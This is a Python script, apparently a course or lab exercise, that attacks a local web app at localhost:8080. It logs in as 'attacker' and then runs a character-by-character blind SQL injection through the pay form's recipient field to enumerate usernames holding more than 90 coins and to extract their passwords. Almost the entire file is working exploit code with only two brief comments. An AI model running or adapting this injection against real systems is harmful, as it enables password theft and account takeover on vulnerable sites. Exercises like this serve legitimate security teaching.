from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"
options = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
username_len = 8
password_len = 20
usernames_beginning_with = ['a', 'v']


def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login"
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "session_id": sess.cookies['session']
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    users_found = []
    for trial_username in usernames_beginning_with:
        curr_username = trial_username
        found_username = False
        for length in range(username_len):
            for char_option in options:
                if char_option == '0':
                    found_username = True
                    print("Found User: ", curr_username)
                    users_found.append(curr_username)
                    break
                curr_username+=char_option
                if not submit_pay_form(sess, "' OR users.username LIKE '{}%' AND users.coins > 90 AND users.username NOT LIKE 'NULL".format(curr_username), "0"):
                    curr_username=curr_username[:-1]
                else:
                    break
            if found_username:
                break
    
    #Now the attacker has found users with more than 90 coins.
    #Now the attacker will try to find the passwords using a similar attack
    for user in users_found:
        curr_password = ""
        found_password = False
        for length in range(password_len):
            for char_option in options:
                if char_option == '0':
                    found_password = True
                    print("For User: ", user, " Found Password:",  curr_password)
                    break
                curr_password+=char_option
                # print("Trying: ", curr_password )
                if not submit_pay_form(sess, "' OR users.username LIKE '{}%' AND users.password LIKE '{}%".format(user, curr_password), "0"):
                    curr_password=curr_password[:-1]
                else:
                    break
            if found_password:
                break


def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
